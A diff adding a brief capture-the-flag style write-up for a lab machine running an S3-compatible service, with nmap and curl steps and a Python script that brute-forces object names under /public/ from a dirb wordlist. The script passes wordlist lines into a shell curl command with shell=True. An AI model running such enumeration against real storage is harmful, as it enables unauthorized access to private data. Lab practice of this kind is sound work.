@@ -1,0 +1,38 @@
+In this machine we have to guess the object name.
+start your nmap and see on which port the service is running.
+
+now use curl command to check whether the access to the s3 is denied or accepted.
+# curl http://192.X.Y.3:9000
+we are getting access denied on this url, but if you try with /public/123 then you are getting that "the specified key does not exist"
+now you have to brute force the /public/* from the given wordlist.
+I have created a python3 script which did it for me.
+
+
+			import subprocess
+			
+			f=open("/usr/share/dirb/wordlists/small.txt")
+			check_string="not exist"
+			url="http://192.149.170.3:9000/public/"
+			final_url=[]
+			for x in f:
+			    a=url+x
+			    final_url.append(a)
+			for x in final_url:
+			    z=subprocess.check_output("curl"+" -s "+x,shell=True)
+			    y=str(z)
+			
+			    if check_string in y:
+			       print("not found")
+			    else:
+			        print(x)
+        			print(y)
+
+
+Please ignore my coding skills. You can also use shell script which is tought in the video of this machine.
+
+
+
+
+
+
+
